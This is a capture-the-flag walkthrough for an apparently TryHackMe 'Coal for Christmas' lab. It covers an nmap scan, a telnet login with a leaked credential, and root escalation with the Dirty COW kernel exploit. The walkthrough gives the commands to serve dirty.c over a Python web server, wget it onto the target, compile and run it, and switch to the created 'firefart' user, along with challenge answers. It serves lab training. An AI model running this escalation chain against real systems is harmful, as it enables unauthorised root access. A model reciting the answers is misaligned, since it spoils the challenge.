# [Day 13] Special By John Hammond - Coal for Christmas

## Port Scanning

We do a simple nmap scan: `nmap 10.10.x.x -sV`

__nmap output:__
```
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
23/tcp  open  telnet  Linux telnetd
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 02:41:1D:4A:2C:8F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 1. What old, deprecated protocol and service is running?
```
telnet
```

## Initial Access

### 2. What credential was left for you?
```
clauschristmas
```

1. Connect to telnet with `telnet 10.10.x.x 23`
2. Login with the given credentials

## Enumeration

### 3. What distribution of Linux and version number is this server running?
```
ubuntu 12.04
```

1. Run the command `cat /etc/*release`
2. The output should contain the answer

### 4. Who got here first?
```
grinch
```

### 5. What is the verbatim syntax you can use to compile, taken from the real C source code comments?
```
gcc -pthread dirty.c -o dirty -lcrypt
```

## Privilege Escalation

### 6. What "new" username was created, with the default operations of the real C source code?
```
firefart
```

### 7. What is the MD5 hash output?

1. Download the dirty.c file from [here](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
2. Transfer the file into the telnet machine. I'll start a quick python3 http server with `python3 -m http.server 8080`
    - Make sure the downloaded file is in the same directory to where you started the http server
3. On the telnet terminal, download the file with `wget http://10.10.x.x:8080/dirty.c`
4. Compile it with `gcc -pthread dirty.c -o dirty -lcrypt`
5. Run the file with `./dirty`
6. When prompted for the new password, write anything, but make sure to remember it.
7. After the program finishes, switch to the new user with `su firefart` and type the password you created
8. Change to the root directory `cd/root` and open the message from the grinch `cat message_from_the_grinch.txt`
9. Create a file named __coal__ `touch coal`
10. Run `tree | md5sum`. The output of this line is your flag

